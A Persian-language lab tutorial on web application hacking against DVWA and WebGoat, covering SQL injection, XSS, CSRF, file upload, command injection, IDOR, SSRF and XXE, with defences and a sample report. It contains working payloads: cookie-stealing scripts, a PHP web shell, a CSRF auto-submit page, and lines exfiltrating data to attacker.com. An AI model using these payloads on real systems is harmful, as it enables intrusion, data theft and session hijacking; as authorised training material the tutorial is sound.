🔰 مقدمه – هک برنامه‌های وب

هک برنامه‌های وب (Web Application Hacking) یکی از حیاتی‌ترین حوزه‌های تست نفوذ است. برنامه‌های وب امروزه قلب تپنده کسب‌وکارها، بانک‌داری، شبکه‌های اجتماعی و خدمات ابری هستند. هرگونه آسیب‌پذیری در این برنامه‌ها می‌تواند به نشت اطلاعات حساس، سرقت هویت، اختلال در خدمات و خسارت‌های مالی هنگفت منجر شود.

در این آزمایشگاه جامع، شما با رایج‌ترین آسیب‌پذیری‌های برنامه‌های وب بر اساس OWASP Top 10 آشنا شده و آنها را به‌صورت عملی بر روی محیط‌های آزمایشگاهی پیاده‌سازی خواهید کرد. این آزمایشگاه شامل ۸ سناریوی عملی با جزئیات کامل گام‌به‌گام است.

🎯 اهداف این آزمایشگاه:
  • شناسایی و بهره‌برداری از SQL Injection (همه انواع)
  • شناسایی و بهره‌برداری از XSS (Reflected, Stored, DOM-based)
  • شناسایی و بهره‌برداری از CSRF و Session Fixation
  • آسیب‌پذیری آپلود فایل و تکنیک‌های Bypass
  • Command Injection و تکنیک‌های پیشرفته
  • IDOR (Insecure Direct Object Reference)
  • SSRF (Server-Side Request Forgery)
  • XXE (XML External Entity Injection)
  • تسلط بر ابزارهای Burp Suite, SQLmap, Nikto, Gobuster
  • توانایی گزارش‌نویسی حرفه‌ای
⚠️ هشدار اخلاقی: تمام تمرینات این آزمایشگاه فقط در محیط‌های آزمایشگاهی با مجوز انجام شوند. هک وب‌سایت‌های دیگران بدون مجوز جرم است.

🏗️ معماری برنامه‌های وب

برای درک آسیب‌پذیری‌های برنامه‌های وب، ابتدا باید با معماری و اجزای آنها آشنا شوید.

📌 اجزای اصلی معماری وب

  • کلاینت (Client): مرورگر کاربر که درخواست‌ها را ارسال می‌کند.
  • وب‌سرور (Web Server): درخواست‌ها را دریافت و صفحات را ارائه می‌دهد.
  • اپلیکیشن سرور (Application Server): منطق برنامه را اجرا می‌کند (PHP, ASP.NET, Node.js, Python).
  • پایگاه داده (Database): داده‌های برنامه را ذخیره می‌کند.
  • APIها: ارتباط بین اجزا را مدیریت می‌کنند.

📌 مدل‌های معماری

  • Single-Tier: همه اجزا روی یک سرور.
  • Two-Tier (Client-Server): کلاینت و سرور.
  • Three-Tier: کلاینت، سرور برنامه، پایگاه داده.
  • N-Tier (Microservices): چندین سرویس مجزا.

📌 چرخه درخواست HTTP

  1. کاربر URL را در مرورگر وارد می‌کند.
  2. مرورگر یک درخواست HTTP به سرور ارسال می‌کند.
  3. وب‌سرور درخواست را پردازش کرده و به برنامه مناسب هدایت می‌کند.
  4. برنامه داده‌ها را از پایگاه داده دریافت یا ذخیره می‌کند.
  5. پاسخ HTTP (HTML, JSON, XML) به مرورگر بازگردانده می‌شود.
💡 نکته: هر لایه از این معماری می‌تواند حاوی آسیب‌پذیری‌های خاص خود باشد. یک هکر قانونمند باید تمام لایه‌ها را بررسی کند.

📋 OWASP Top 10 (نسخه ۲۰۲۱)

OWASP (Open Web Application Security Project) یک سازمان غیرانتفاعی است که به بهبود امنیت برنامه‌های وب می‌پردازد. لیست ۱۰ آسیب‌پذیری برتر OWASP (OWASP Top 10) یک مرجع استاندارد برای شناسایی خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب است.

#آسیب‌پذیریتوضیح
۱شکست در کنترل دسترسی (Broken Access Control)نقض سیاست‌های دسترسی
۲شکست در رمزنگاری (Cryptographic Failures)استفاده از رمزنگاری ضعیف یا عدم استفاده
۳تزریق (Injection)تزریق کد مخرب (SQL, Command, LDAP)
۴طراحی ناامن (Insecure Design)نقص در طراحی امنیتی
۵پیکربندی ناامن (Security Misconfiguration)تنظیمات اشتباه امنیتی
۶اجزای آسیب‌پذیر و قدیمی (Vulnerable Components)کتابخانه‌های قدیمی
۷شکست در شناسایی و احراز هویت (Identification Failures)ضعف در احراز هویت
۸شکست در یکپارچگی نرم‌افزار و داده (Integrity Failures)نقض یکپارچگی

💡 نکته: در این آزمایشگاه، آسیب‌پذیری‌های تزریق (SQL, Command)، شکست در کنترل دسترسی (IDOR)، SSRF و پیکربندی ناامن را به‌صورت عملی پوشش می‌دهیم.

⚙️ راه‌اندازی محیط DVWA

DVWA (Damn Vulnerable Web Application) یک برنامه وب آسیب‌پذیر است که به‌طور عمدی برای تمرین هک وب طراحی شده است. این محیط شامل تمام آسیب‌پذیری‌های اصلی OWASP است.

گام ۱: دسترسی به DVWA

DVWA روی Metasploitable 2 یا به‌صورت مستقل قابل نصب است. آدرس‌های دسترسی:

  • روی Metasploitable 2: http://192.168.56.102/dvwa/
  • با Docker: docker run --rm -p 80:80 vulnerables/web-dvwa
  • با XAMPP: نصب در C:\xampp\htdocs\dvwa\
📌 اطلاعات ورود:
  • نام کاربری: admin
  • رمز عبور: password

گام ۲: تنظیم سطح امنیت

برای شروع، سطح امنیت را روی Low قرار دهید:

  • وارد DVWA شوید.
  • به Security بروید.
  • گزینه Low را انتخاب کرده و روی Submit کلیک کنید.
⚠️ توجه: سطح Low تمام آسیب‌پذیری‌ها را فعال می‌کند. در محیط‌های واقعی هرگز از چنین تنظیماتی استفاده نکنید.

گام ۳: صفحات آسیب‌پذیر DVWA

🔍 مرحله ۱: شناسایی وب‌سایت (Web Footprinting)

قبل از هر حمله، باید اطلاعات کاملی از وب‌سایت هدف جمع‌آوری کنید. این مرحله به هکر کمک می‌کند تا نقاط ضعف را شناسایی کند.

📌 ۱. شناسایی وب‌سرور با Netcat

nc -nv 192.168.56.102 80
HEAD / HTTP/1.0
[Enter 2 بار]
HTTP/1.1 200 OK
Date: Sun, 20 Jan 2024 14:23:00 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10

📌 ۲. اسکن با Nmap

nmap -sV -p 80,443 192.168.56.102
nmap --script=http-* -p 80 192.168.56.102

📌 ۳. اسکن دایرکتوری با Gobuster

gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt
/cgi-bin/ (Status: 403)
/dvwa/ (Status: 200)
/images/ (Status: 200)
/index.html (Status: 200)
/phpmyadmin/ (Status: 403)
/server-status (Status: 403)
💡 نکته: دایرکتوری‌های پیدا شده (مانند /phpmyadmin/ و /cgi-bin/) می‌توانند نقاط ورود بالقوه‌ای برای حملات باشند.

📌 ۴. اسکن آسیب‌پذیری با Nikto

nikto -h http://192.168.56.102

+ Server: Apache/2.2.8 (Ubuntu) DAV/2
+ /phpmyadmin/: phpMyAdmin directory found
+ /cgi-bin/test.cgi: CGI test script found

🗄️ سناریو ۱: SQL Injection

SQL Injection یکی از خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب است که در آن مهاجم کد SQL مخرب را به ورودی‌های برنامه تزریق می‌کند. در این بخش، ۴ نوع اصلی SQL Injection را به‌صورت عملی بررسی می‌کنیم.

SQLmap Burp Suite DVWA MySQL

🔴 نوع ۱: Error-based SQL Injection

گام ۱: شناسایی با کاراکتر ' (تیک)

در صفحه SQL Injection، مقدار 1' را وارد کنید:

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1

تحلیل: خطای SQL نشان‌دهنده وجود آسیب‌پذیری است.

گام ۲: پیدا کردن تعداد ستون‌ها

1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -

وقتی خطایی دریافت کردید، یعنی تعداد ستون‌ها کمتر است. در DVWA، ۲ ستون وجود دارد.

گام ۳: استخراج داده با UNION

# استخراج نام پایگاه داده
1' UNION SELECT NULL, database()-- -

# استخراج نام جداول
1' UNION SELECT table_name, NULL FROM information_schema.tables-- -

# استخراج داده از جدول users
1' UNION SELECT user, password FROM users-- -
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

🟡 نوع ۲: Boolean-based Blind SQL Injection

گام ۱: تست با شرط True/False

# شرط True - صفحه عادی نمایش داده می‌شود
1' AND 1=1-- -

# شرط False - صفحه خالی یا خطا
1' AND 1=2-- -

تحلیل: اگر پاسخ‌ها متفاوت باشند، آسیب‌پذیری Blind SQLi تأیید می‌شود.

گام ۲: استخراج کاراکتر اول نام پایگاه داده

1' AND ASCII(SUBSTRING(database(),1,1)) > 100-- -
1' AND ASCII(SUBSTRING(database(),1,1)) = 100-- -
💡 نکته: با تغییر مقدار عددی، کاراکترهای نام پایگاه داده را حدس بزنید. 'd' برابر ۱۰۰ است.

🟢 نوع ۳: Time-based Blind SQL Injection

گام ۱: تست با تأخیر

1' AND SLEEP(5)-- -

تحلیل: اگر صفحه ۵ ثانیه تأخیر داشته باشد، آسیب‌پذیری Time-based تأیید می‌شود.

گام ۲: استخراج با تأخیر شرطی

1' AND IF(ASCII(SUBSTRING(database(),1,1))=100, SLEEP(5), 0)-- -

🔵 نوع ۴: OUT-of-Band SQL Injection

گام ۱: DNS Exfiltration

1' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\test'))-- -
⚠️ نکته: این روش نیاز به سرور DNS قابل کنترل دارد و فقط در برخی تنظیمات کار می‌کند.

🤖 استفاده از SQLmap (خودکار)

# اسکن و شناسایی
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" --batch

# استخراج پایگاه‌های داده
sqlmap -u "..." --cookie="..." --dbs

# استخراج جداول
sqlmap -u "..." --cookie="..." -D dvwa --tables

# استخراج داده از جدول users
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
✅ موفقیت!

SQLmap تمام داده‌های جدول users را استخراج می‌کند.

💉 سناریو ۲: Cross-Site Scripting (XSS)

XSS یک آسیب‌پذیری است که در آن مهاجم کدهای جاوااسکریپت مخرب را به صفحات وب تزریق می‌کند. سه نوع اصلی XSS: Reflected، Stored و DOM-based.

Burp Suite DVWA BeEF XSStrike

🔴 نوع ۱: Reflected XSS

گام ۱: تزریق ساده

در صفحه XSS Reflected، کد زیر را وارد کنید:

<script>alert('XSS!')</script>
یک هشدار با پیام "XSS!" نمایش داده می‌شود.

گام ۲: سرقت کوکی

<script>
    fetch('http://192.168.56.101:8080/steal?cookie=' + document.cookie);
</script>
📌 تحلیل: در Kali یک listener راه‌اندازی کنید: 
nc -lvnp 8080

🟡 نوع ۲: Stored XSS

گام ۱: تزریق در Guestbook

در صفحه XSS Stored، در بخش Name و Message کد زیر را وارد کنید:

<script>alert('Stored XSS!')</script>

تحلیل: پس از ذخیره، هر کاربری که صفحه را باز کند، هشدار را مشاهده می‌کند.

گام ۲: تزریق پیشرفته برای ربودن جلسه

<script>
    var img = new Image();
    img.src = 'http://192.168.56.101:8080/steal?cookie=' + encodeURIComponent(document.cookie);
</script>

🟢 نوع ۳: DOM-based XSS

گام ۱: شناسایی DOM XSS

برنامه‌های وب که از document.write() یا innerHTML بدون فیلتر استفاده می‌کنند، آسیب‌پذیر هستند.

# ورودی مخرب
http://target.com/page.php?name=<script>alert(1)</script>

🛠️ ابزارهای XSS

XSStrike – اسکنر تخصصی XSS

xsstrike -u "http://192.168.56.102/dvwa/vulnerabilities/xss_r/?name=test"

BeEF – بهره‌برداری از مرورگر

beef-xss
📌 توضیح: BeEF یک چارچوب قدرتمند برای کنترل مرورگر قربانی پس از تزریق XSS است.

🔄 سناریو ۳: Cross-Site Request Forgery (CSRF)

CSRF حمله‌ای است که در آن مهاجم کاربر را فریب می‌دهد تا یک درخواست ناخواسته را به وب‌سایت هدف ارسال کند. این حمله از کوکی جلسه کاربر برای احراز هویت استفاده می‌کند.

Burp Suite DVWA

گام ۱: شناسایی CSRF در صفحه تغییر رمز

به صفحه CSRF در DVWA بروید:

http://192.168.56.102/dvwa/vulnerabilities/csrf/

تحلیل: این صفحه بدون هیچ توکن CSRF، رمز عبور را تغییر می‌دهد.

گام ۲: ایجاد صفحه HTML مخرب

<html>
<body>
    <h1>🎉 تبریک! شما برنده شدید!</h1>
    <form action="http://192.168.56.102/dvwa/vulnerabilities/csrf/" method="POST">
        <input type="hidden" name="password_new" value="hacked" />
        <input type="hidden" name="password_conf" value="hacked" />
        <input type="hidden" name="Change" value="Change" />
        <input type="submit" value="کلیک کنید!" style="width:200px;height:50px;font-size:20px;" />
    </form>
    <p>برای دریافت جایزه خود کلیک کنید!</p>
</body>
</html>

فایل را روی Kali ذخیره کرده و از طریق مرورگر هدف باز کنید.

گام ۳: حمله CSRF خودکار (بدون کلیک)

<html>
<body onload="document.forms[0].submit()">
    <form action="http://192.168.56.102/dvwa/vulnerabilities/csrf/" method="POST">
        <input type="hidden" name="password_new" value="hacked" />
        <input type="hidden" name="password_conf" value="hacked" />
        <input type="hidden" name="Change" value="Change" />
    </form>
</body>
</html>
🎉 موفقیت!

با باز شدن صفحه، رمز عبور به hacked تغییر می‌کند.

📤 سناریو ۴: آسیب‌پذیری آپلود فایل

آسیب‌پذیری آپلود فایل به مهاجم اجازه می‌دهد تا یک فایل مخرب (معمولاً Web Shell) را روی سرور آپلود کرده و به آن دسترسی پیدا کند.

Burp Suite DVWA Web Shell

گام ۱: تشخیص آسیب‌پذیری

به صفحه File Upload بروید و یک فایل تصویر معمولی آپلود کنید.

http://192.168.56.102/dvwa/vulnerabilities/upload/

گام ۲: آپلود Web Shell (PHP)

فایل shell.php با محتوای زیر:

<?php
system($_GET['cmd']);
?>

فایل را آپلود کرده و از طریق مرورگر دسترسی پیدا کنید:

http://192.168.56.102/dvwa/hackable/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

گام ۳: تکنیک‌های Bypass فیلتر

  • تغییر پسوند: shell.php.jpg
  • تغییر نوع MIME: Content-Type: image/jpeg
  • تزریق کد در تصویر: exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
  • آپلود فایل .htaccess: AddType application/x-httpd-php .jpg
⚠️ هشدار: Web Shell به مهاجم دسترسی کامل به سرور می‌دهد. همیشه آپلود فایل را محدود کنید.

⌨️ سناریو ۵: Command Injection

Command Injection زمانی رخ می‌دهد که برنامه وب، ورودی کاربر را به‌عنوان دستور سیستم‌عامل اجرا می‌کند. این آسیب‌پذیری به مهاجم اجازه می‌دهد دستورات دلخواه را روی سرور اجرا کند.

Burp Suite DVWA

گام ۱: تشخیص

به صفحه Command Injection بروید و 127.0.0.1 وارد کنید.

http://192.168.56.102/dvwa/vulnerabilities/exec/

گام ۲: تزریق دستور

127.0.0.1; id
127.0.0.1 | whoami
127.0.0.1 && ls -la
127.0.0.1; cat /etc/passwd
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
uid=33(www-data) gid=33(www-data) groups=33(www-data)

گام ۳: Bypass فیلترها

  • استفاده از کاراکترهای جایگزین: &&، ||، `
  • کدگذاری URL: %3B به جای ;
  • استفاده از متغیرهای محیطی: ${IFS} به جای فاصله
  • استفاده از کدگذاری Base64: echo 'id' | base64

🔐 سناریو ۶: IDOR (Insecure Direct Object Reference)

IDOR یک آسیب‌پذیری کنترل دسترسی است که در آن برنامه وب به کاربران اجازه می‌دهد به اشیاء (مانند فایل‌ها، رکوردهای پایگاه داده) بدون بررسی مجوز دسترسی پیدا کنند.

Burp Suite OWASP WebGoat

گام ۱: شناسایی IDOR

در برنامه‌های وب، پارامترهایی مانند id، user_id، file را بررسی کنید.

# درخواست معمولی
GET /user/profile?id=123

# حمله IDOR
GET /user/profile?id=124

تحلیل: اگر به پروفایل کاربر دیگر دسترسی پیدا کنید، IDOR وجود دارد.

گام ۲: استخراج داده با IDOR

# استخراج فایل‌های حساس
GET /download?file=../../etc/passwd
GET /download?file=../config.php
GET /order?order_id=1001&action=view

گام ۳: تشخیص IDOR با Burp Suite

  • درخواست را در Burp Repeater ذخیره کنید.
  • پارامترهای عددی را تغییر دهید.
  • پاسخ‌ها را برای شناسایی داده‌های غیرمجاز بررسی کنید.

🌐 سناریو ۷: SSRF (Server-Side Request Forgery)

SSRF یک آسیب‌پذیری است که در آن مهاجم می‌تواند سرور را وادار کند تا درخواست‌هایی به آدرس‌های دلخواه (مثل سرورهای داخلی) ارسال کند.

Burp Suite AWS Metadata

گام ۱: شناسایی SSRF

به دنبال پارامترهایی باشید که URL دریافت می‌کنند:

GET /fetch?url=http://example.com
POST /api/proxy
?img_url=http://target.com/image.jpg

گام ۲: دسترسی به سرورهای داخلی

# دسترسی به Metadata در AWS
GET /fetch?url=http://169.254.169.254/latest/meta-data/

# اسکن پورت‌های داخلی
GET /fetch?url=http://127.0.0.1:8080/admin
GET /fetch?url=http://192.168.1.1
GET /fetch?url=http://localhost:3306
🎉 موفقیت!

با SSRF می‌توانید به شبکه داخلی سازمان دسترسی پیدا کنید.

گام ۳: Bypass فیلترها

  • کدگذاری URL: http://%31%37%32%2e%31%36%38%2e%31%2e%31
  • استفاده از Redirect: http://attacker.com/redirect?url=http://169.254.169.254
  • استفاده از DNS: http://internal.target.com
  • استفاده از IP به فرمت Decimal: http://2852039166 (معادل 169.254.169.254)

📄 سناریو ۸: XXE (XML External Entity Injection)

XXE یک آسیب‌پذیری است که در برنامه‌هایی که XML را پردازش می‌کنند، رخ می‌دهد. مهاجم با تزریق یک موجودیت خارجی، می‌تواند فایل‌های سیستمی را بخواند، درخواست‌های SSRF انجام دهد یا باعث DoS شود.

Burp Suite OWASP WebGoat

گام ۱: شناسایی XXE

به دنبال ورودی‌های XML در برنامه باشید (APIها، SOAP، آپلود XML).

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe "Hello">]>
<root><name>&xxe;</name></root>

تحلیل: اگر "Hello" در پاسخ نمایش داده شود، XXE وجود دارد.

گام ۲: خواندن فایل‌های سیستمی

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

گام ۳: SSRF با XXE

<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
%remote;
]>
<root><name>&xxe;</name></root>

🛠️ آموزش پیشرفته Burp Suite

📌 ۱. Proxy – ضبط و دستکاری درخواست‌ها

  • تنظیم پروکسی: 127.0.0.1:8080
  • نصب گواهی HTTPS: http://burp
  • Intercept: توقف و تغییر درخواست‌ها
  • HTTP History: مشاهده تمام درخواست‌ها

📌 ۲. Repeater – ارسال مجدد درخواست‌ها

  • تغییر پارامترها و ارسال مجدد
  • مشاهده پاسخ‌های مختلف
  • تست آسیب‌پذیری‌های دستی

📌 ۳. Intruder – حملات خودکار

# تنظیمات حمله
Positions: مشخص کردن نقاط تزریق
Payloads: بارگذاری دیکشنری
Attack Types: Sniper, Battering ram, Pitchfork, Cluster bomb
  • Sniper: تست یک نقطه با چندین payload
  • Battering ram: تست چند نقطه با یک payload
  • Pitchfork: تست چند نقطه با چندین payload (همزمان)
  • Cluster bomb: تست تمام ترکیب‌ها

📌 ۴. Scanner – اسکن خودکار

  • اسکن فعال و غیرفعال
  • شناسایی SQL Injection, XSS, CSRF, Path Traversal
  • نمایش نتایج با سطح خطر (High, Medium, Low)
💡 نکته: نسخه Community فاقد Scanner است. برای اسکن خودکار از OWASP ZAP استفاده کنید.

📌 ۵. Decoder – رمزگشایی و رمزنگاری

  • Base64, URL, HTML, Hex, Unicode
  • Hash: MD5, SHA-1, SHA-256

📌 ۶. Comparer – مقایسه پاسخ‌ها

  • مقایسه دو پاسخ برای یافتن تفاوت‌ها
  • تشخیص تغییرات در حملات Blind

📌 ۷. افزونه‌های مفید (BApps)

  • ActiveScan++ – اسکن پیشرفته
  • Logger++ – لاگ‌گیری پیشرفته
  • Turbo Intruder – Intruder با سرعت بالا
  • XSS Validator – تأیید XSS
  • JWT Editor – دستکاری JWT

🛠️ ابزارهای تکمیلی وب

ابزارکاربردمثال
OWASP ZAP تست نفوذ وب (جایگزین Burp) zap
Nikto اسکن آسیب‌پذیری وب‌سرور nikto -h target.com

🛡️ راه‌های مقابله با حملات وب

📌 ۱. جلوگیری از SQL Injection

  • Prepared Statements: مهم‌ترین روش
  • Stored Procedures: با پارامترهای امن
  • فیلتر کردن ورودی‌ها: اعتبارسنجی نوع و طول داده
  • استفاده از ORM: مانند Hibernate, Entity Framework
  • غیرفعال کردن نمایش خطاها: جلوگیری از Error-based SQLi

📌 ۲. جلوگیری از XSS

  • Output Encoding: htmlspecialchars() در PHP
  • Content Security Policy (CSP): محدود کردن منابع
  • HttpOnly Cookies: جلوگیری از دسترسی جاوااسکریپت به کوکی
  • فیلتر کردن ورودی‌ها: حذف تگ‌های HTML و جاوااسکریپت

📌 ۳. جلوگیری از CSRF

  • CSRF Tokens: توکن تصادفی در هر فرم
  • SameSite Cookies: SameSite=Strict
  • Referer/Origin Validation: بررسی هدر Referer
  • احراز هویت چندعاملی (MFA): برای اقدامات حساس

📌 ۴. جلوگیری از آپلود فایل

  • بررسی نوع فایل: با استفاده از MIME type و محتوا
  • محدود کردن پسوندها: فقط پسوندهای مجاز
  • ذخیره خارج از ریشه وب: جلوگیری از دسترسی مستقیم
  • تغییر نام فایل: به یک نام تصادفی
  • اسکن با آنتی‌ویروس: برای فایل‌های آپلودی

📌 ۵. جلوگیری از Command Injection

  • استفاده از توابع امن: escapeshellarg()
  • اجتناب از اجرای دستورات: استفاده از APIهای اختصاصی
  • فیلتر کردن کاراکترهای خطرناک: ; | && || `

📌 ۶. جلوگیری از IDOR

  • بررسی مجوز دسترسی: قبل از نمایش هر داده
  • استفاده از UUID: به جای IDهای عددی قابل حدس
  • چک کردن دسترسی در سرور: نه فقط در کلاینت

📌 ۷. جلوگیری از SSRF

  • فیلتر کردن URLها: فقط دامنه‌های مجاز
  • استفاده از Whitelist: برای آدرس‌های مجاز
  • غیرفعال کردن Redirect: جلوگیری از تغییر مسیر
  • محدود کردن پروتکل‌ها: فقط HTTP/HTTPS

📌 ۸. جلوگیری از XXE

  • غیرفعال کردن External Entities: در پردازشگر XML
  • استفاده از JSON: به جای XML
  • فیلتر کردن ورودی‌های XML: حذف DOCTYPE
💡 نکته: بهترین دفاع، ترکیبی از کدنویسی امن، پیکربندی صحیح و استفاده از ابزارهای امنیتی است.

📄 گزارش‌نویسی حرفه‌ای

📌 نمونه گزارش (فرمت هر آسیب‌پذیری)

## آسیب‌پذیری: SQL Injection

**سطح خطر:** Critical (CVSS: 9.8)
**مسیر:** /dvwa/vulnerabilities/sqli/?id=1
**توضیح:** برنامه وب ورودی کاربر را بدون فیلتر کردن در کوئری SQL قرار می‌دهد.

**شواهد:**
1' UNION SELECT NULL, database()-- -
خروجی: dvwa

**تأثیر:** دسترسی کامل به پایگاه داده، سرقت اطلاعات حساس

**توصیه:** استفاده از Prepared Statements و فیلتر کردن ورودی‌ها

🧪 تمرین‌های عملی

این تمرینات به شما کمک می‌کنند تا مهارت‌های خود را تقویت کنید:

  • تمرین ۱: سطح امنیت DVWA را به Medium تغییر دهید و حملات SQL Injection و XSS را دوباره اجرا کنید.
  • تمرین ۲: با استفاده از Burp Suite Intruder، یک حمله Brute-Force به صفحه ورود DVWA انجام دهید.
  • تمرین ۳: با OWASP WebGoat کار کنید و سناریوهای مختلف را تمرین کنید.
  • تمرین ۴: یک اسکن کامل از وب‌سایت DVWA با Nikto و Gobuster انجام دهید.
  • تمرین ۵: با استفاده از XSS، یک کوکی را بدزدید و با استفاده از آن جلسه کاربر را ربوده کنید.
  • تمرین ۶: در OWASP WebGoat، سناریوی IDOR و SSRF را کامل کنید.
  • تمرین ۷: یک گزارش حرفه‌ای از تمام آسیب‌پذیری‌های پیدا شده در DVWA تهیه کنید.
  • تمرین ۸: با استفاده از SQLmap، داده‌های جدول users را استخراج کرده و هش‌ها را با Hashcat کرک کنید.
